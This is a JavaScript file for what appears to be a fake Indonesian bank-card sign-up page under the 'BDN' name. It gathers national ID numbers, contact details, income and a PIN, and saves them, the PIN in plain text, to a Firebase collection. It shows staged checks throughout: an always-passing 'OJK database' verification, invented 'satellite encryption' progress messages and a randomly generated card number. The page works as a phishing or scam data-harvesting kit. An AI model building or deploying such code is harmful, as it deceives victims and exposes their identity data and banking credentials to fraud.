let currentStep = 1;
const totalSteps = 8;

// Set Tanggal Hari Ini
document.getElementById('currentDate').innerText = new Date().toLocaleDateString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });

function nextStep(s) {
    if (s === 2) {
        const nama = document.getElementById('inputNama').value.trim();
        const nik = document.getElementById('inputNIK').value.trim();
        if (!/^[a-zA-Z\s]{3,50}$/.test(nama)) return alert("Nama tidak valid!");
        if (nik.length < 16 || isNaN(nik)) return alert("NIK harus 16 digit angka!");
    }
    if (s === 6 && document.getElementById('inputPW').value.length < 6) return alert("PIN harus 6 digit!");

    currentStep = s;
    updateUI(s);
    if (s === 6) simulasiAnalisis();
}

function updateUI(s) {
    document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
    document.getElementById('step' + s).classList.add('active');
    const percent = ((s - 1) / (totalSteps - 1)) * 100;
    document.getElementById('progressLine').style.width = percent + "%";
    document.querySelectorAll('.circle').forEach((c, i) => {
        if (i < s - 1) { c.classList.add('completed'); c.innerHTML = "✓"; }
        else if (i === s - 1) { c.classList.add('active'); c.innerHTML = i + 1; }
        else { c.classList.remove('active', 'completed'); c.innerHTML = i + 1; }
    });
}

function simulasiAnalisis() {
    const status = document.getElementById('slikStatus');
    const btn = document.getElementById('btnSlik');
    setTimeout(() => { status.innerText = "Mengecek Database OJK..."; }, 1500);
    setTimeout(() => { 
        status.innerHTML = "<b style='color:green'>VERIFIKASI LOLOS</b><br>Skor Kredit: Terverifikasi"; 
        btn.style.display = "block";
    }, 4000);
}

async function generateFinal() {
    if (!document.getElementById('checkAgree').checked) return alert("Setujui Kebijakan!");
    
    const btn = document.getElementById('btnGenerate');
    btn.disabled = true; btn.innerText = "MEMERIKSA ANTREAN...";

    try {
        // --- CEK KAPASITAS ANTREAN (LIMIT 2 HARI) ---
        const snapshot = await db.collection("nasabah").get();
        const totalNasabah = snapshot.size;

        // Simulasi jika antrean melebihi batas (Misal batas 500 orang per 2 hari)
        if (totalNasabah > 500) {
            alert("MAAF: Antrean server BDN sedang penuh (Estimasi tunggu > 2 Hari). Pendaftaran ditutup sementara demi keamanan data.");
            location.reload();
            return;
        }

        // --- VALIDASI DUPLIKAT ---
        const nik = document.getElementById('inputNIK').value;
        const check = await db.collection("nasabah").where("nik", "==", nik).get();
        if (!check.empty) {
            alert("NIK sudah terdaftar!");
            location.reload(); return;
        }

        updateUI(8);
        processQueue();

    } catch (e) { alert("Sistem Error!"); btn.disabled = false; }
}

function processQueue() {
    const qStatus = document.getElementById('queueStatus');
    const tDisplay = document.getElementById('timerDisplay');
    const fillBar = document.getElementById('fillBar');

    let secondsLeft = 120; // Mulai dari 2 Menit (120 Detik)
    
    // Update Progress Visual
    const interval = setInterval(() => {
        secondsLeft--;
        
        // Update Bar (Dihitung dari 120 detik)
        let progress = ((120 - secondsLeft) / 120) * 100;
        fillBar.style.width = progress + "%";

        // Update Teks Status
        if (secondsLeft > 90) qStatus.innerText = "Menghubungkan ke Enkripsi Satelit...";
        else if (secondsLeft > 60) qStatus.innerText = "Sinkronisasi Data Kependudukan...";
        else if (secondsLeft > 30) qStatus.innerText = "Menyusun Nomor Kartu Digital...";
        else qStatus.innerText = "Finalisasi Data Nasabah...";

        // Update Timer (Real-time menit & detik)
        let mins = Math.floor(secondsLeft / 60);
        let secs = secondsLeft % 60;
        tDisplay.innerText = `Estimasi: ${mins} Min ${secs < 10 ? '0'+secs : secs} Detik`;

        if (secondsLeft <= 0) {
            clearInterval(interval);
            saveToFirebase();
        }
    }, 1000); // Jalan setiap 1 detik
}

async function saveToFirebase() {
    const nama = document.getElementById('inputNama').value;
    const nik = document.getElementById('inputNIK').value;
    const wa = document.getElementById('inputWA').value;
    const email = document.getElementById('inputEmail').value;
    const job = document.getElementById('jobType').value;
    const income = document.getElementById('income').value;
    const emergency = document.getElementById('emergencyName').value;
    const pin = document.getElementById('inputPW').value;
    
    const fullNo = "0810" + Array.from({length: 12}, () => Math.floor(Math.random() * 10)).join('');

    try {
        // Data sangat detail untuk mencegah korupsi data
        await db.collection("nasabah").add({
            personal: { nama, nik, wa, email },
            finance: { job, income, saldo: 0 },
            security: { pin, nomor_kartu: fullNo },
            meta: { emergency_contact: emergency, tgl_daftar: new Date().toISOString(), status: "Aktif" }
        });

        document.getElementById('processingArea').style.display = 'none';
        document.getElementById('finalResult').style.display = 'block';
        document.getElementById('displayNo').innerText = fullNo.match(/.{1,4}/g).join(" ");
        document.getElementById('displayName').innerText = nama.toUpperCase();
    } catch (e) { alert("Gagal Simpan Data!"); }
}

function takeScreenshot() {
    html2canvas(document.getElementById('captureArea'), {scale: 3}).then(canvas => {
        const link = document.createElement('a');
        link.download = 'BDN-Platinum-Card.png';
        link.href = canvas.toDataURL();
        link.click();
    });
}
